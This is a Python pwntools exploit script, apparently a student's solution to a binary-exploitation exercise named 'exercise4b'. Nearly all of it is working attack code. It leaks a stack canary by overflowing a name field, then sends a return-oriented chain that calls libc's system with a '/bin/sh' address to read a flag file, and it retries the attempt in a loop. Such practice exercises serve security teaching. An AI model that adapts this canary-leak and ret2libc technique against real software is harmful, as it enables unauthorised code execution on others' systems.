#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise4b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def exploit():
    r = start()

    pop_rdi_gad = 0x401543 # These can be used bc no PIE, or how do I again get the base??
    pop_pop_ret = 0x401541

    #input()
    r.sendline(b"cat flag") # name will be moved into rdi for strcmp and still there for system
    # First canary
    r.sendline(b"A"*19) # name
    r.recvuntil(b"Well of course ")
    canary_leak = r.recvuntil(b" is not the password")[:-len(" is not the password")]
    canary = u32(canary_leak[20:24])
    print(f"Canary {hex(canary)}")
    # do the system call using first a rop chain for setting
    system_add = r.libc.symbols['system']
    sh_add = system_add + 0x16219a # offset to bin sh
    #sh_add = r.libc.search('/bin/sh')
    #print(flag_add[0])
    # use bin sh in libc to not use stack
    cat_flag = b"cat flag\x00" # Input to the shell from bin sh???
    r.sendline(cat_flag + b"A"*11 + p32(canary) + b"B"*16 + p64(pop_pop_ret) + p64(sh_add) + p64(sh_add) + p64(system_add)) # use pop pop gadget to align stack and then go to system
    #r.interactive()
    r.recvuntil(b"flag is not the password") # get rid of garbage
    print(r.recvall(timeout=1).decode())


for i in range(20):
    try:
        exploit()
    except:
        pass
